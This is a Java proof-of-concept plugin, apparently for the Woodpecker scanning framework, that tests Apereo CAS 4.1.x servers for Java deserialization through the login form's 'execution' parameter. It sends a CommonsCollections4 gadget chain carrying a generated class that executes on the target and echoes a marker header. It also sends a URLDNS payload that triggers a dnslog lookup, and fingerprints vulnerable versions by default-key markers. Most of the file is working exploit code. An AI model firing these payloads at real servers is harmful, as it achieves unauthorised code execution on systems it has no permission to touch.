package me.gv7.woodpecker.vuldb.execution.deserial;

import me.gv7.jevilcode.config.AbstractConfig;
import me.gv7.jevilcode.jEvilCodeApi;
import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.tools.codec.BASE64Encoder;
import me.gv7.woodpecker.tools.misc.RandomUtil;

import java.util.*;

public class PocImpl implements IPoc {
    IScanResult scanResult = null;


    @Override
    public IScanResult doVerify(ITarget target, IResultOutput iResultOutput) throws Throwable{
        scanResult = VulPluginImpl.pluginHelper.createScanResult();
        String vulURL = target.getAddress();
        CommonUtil.checkUrl(vulURL,iResultOutput);
        verifyByEcho(vulURL,iResultOutput);
        if(!scanResult.isExists()){
            verifyByDnslog(vulURL,iResultOutput);
        }
        if(!scanResult.isExists()){
            verifyByResponseExecution(vulURL,iResultOutput);
        }
        return scanResult;
    }

    private void verifyByEcho(String vulURL,IResultOutput resultOutput) {
        resultOutput.infoPrintln(String.format("开始使用CommonsCollections4进行Tomcat中间件回显检测....."));
        try {
            String respHeaderKey = RandomUtil.getRandomString(10);
            String respHeaderValue = RandomUtil.getRandomString(10);
            AbstractConfig config = new AbstractConfig();
            config.setCodeBrokeName("TomcatEchoCheck1");
            config.setCodebrokeArgs(String.format("%s|%s", respHeaderKey, respHeaderValue));
            config.setOUTPUT_FORMAT(AbstractConfig.OF_CLASS);
            config.setExtendsTransletType(AbstractConfig.ET_JDK);
            jEvilCodeApi evilCodeApi = new jEvilCodeApi(config);
            byte[] clazzBytes = evilCodeApi.generate();
            String ysoCmd = String.format("class_base64:%s", new BASE64Encoder().encode(clazzBytes));

            String payload = CommonUtil.generate("CommonsCollections4", ysoCmd);
            Map<String, String> requestBody = new HashMap<>();
            requestBody.put("execution", payload);

            RawResponse rawResponse = Requests.post(vulURL).body(requestBody).send();
            String headerValue = rawResponse.getHeader(respHeaderKey);
            resultOutput.infoPrintln(headerValue);
            if (headerValue != null && respHeaderValue.contains(headerValue)) {
                String msg = String.format("收到回显标志:%s,漏洞存在!", headerValue);
                scanResult.setExists(true);
                scanResult.setMsg(msg);
                resultOutput.successPrintln(msg);
            } else {
                resultOutput.failPrintln(String.format("未发现回显标志:%s,回显检测未发现漏洞", respHeaderValue));
            }
        }catch (Throwable t){
            resultOutput.errorPrintln(VulPluginImpl.pluginHelper.getThrowableInfo(t));
        }
    }

    private void verifyByDnslog(String vulURL,IResultOutput resultOutput){
        if(VulPluginImpl.idnsLog.isSetAndEnable()){
            String domain = VulPluginImpl.idnsLog.getRandomVerifyDomain();
            try {
                String payload = CommonUtil.generate("URLDNS", String.format("http://%s", domain));
                Map<String, String> requestBody = new HashMap<>();
                requestBody.put("execution", payload);
                Requests.post(vulURL).body(requestBody).timeout(10000).send();
                resultOutput.infoPrintln(String.format("触发dnslog(%s) payload发送完成,1秒后查询Dnslog记录......", domain));
                if (VulPluginImpl.idnsLog.isExistsDNSLog(domain)) {
                    String msg = String.format("查询到%s记录,漏洞存在!", domain);
                    scanResult.setMsg(msg);
                    scanResult.setExists(true);
                    resultOutput.successPrintln(msg);
                } else {
                    resultOutput.failPrintln(String.format("未查询到%s记录,dnslog检测未发现漏洞", domain));
                }
            }catch (Exception e){
                resultOutput.errorPrintln(VulPluginImpl.pluginHelper.getThrowableInfo(e));
            }
        }else{
            resultOutput.infoPrintln("Dnslog模块未打开，本次将不用它来进行漏洞检测");
        }
    }


    /**
     * 通过访问登录界面，判断response中是否存在execution,_AAAA/_ZXlK关键字
     * @param vulURL
     * @param resultOutput
     */
    private void verifyByResponseExecution(String vulURL,IResultOutput resultOutput){
        RawResponse rawResponse = Requests.get(vulURL).timeout(10000).send();
        String respBody = rawResponse.readToText();
        String msg = null;
        if(respBody.contains("execution")){
            if(respBody.contains("_AAAA")){
                msg = String.format("response包含_AAAA关键字,CAS在4.1.x-4.1.6版本之间，可以使用默认密钥加密反序列化数据");
                resultOutput.successPrintln(msg);
                scanResult.setExists(true);
                scanResult.setMsg(msg);
            }else if(respBody.contains("_ZXlK")){
                msg = String.format("response包含_ZXlK关键字,CAS在4.1.x-4.1.6版本之间，需要寻找服务器上的密钥加密反序列化数据");
                resultOutput.successPrintln(msg);
                scanResult.setExists(true);
                scanResult.setMsg(msg);
            }else{
                resultOutput.failPrintln(String.format("response发现有execution参数,但没有_AAAA/_ZXlK关键字,说明CAS不是漏洞版本"));
            }
        }else{
            resultOutput.failPrintln(String.format("访问%s,未发现execution参数。漏洞应该不存在！",vulURL));
        }
    }
}
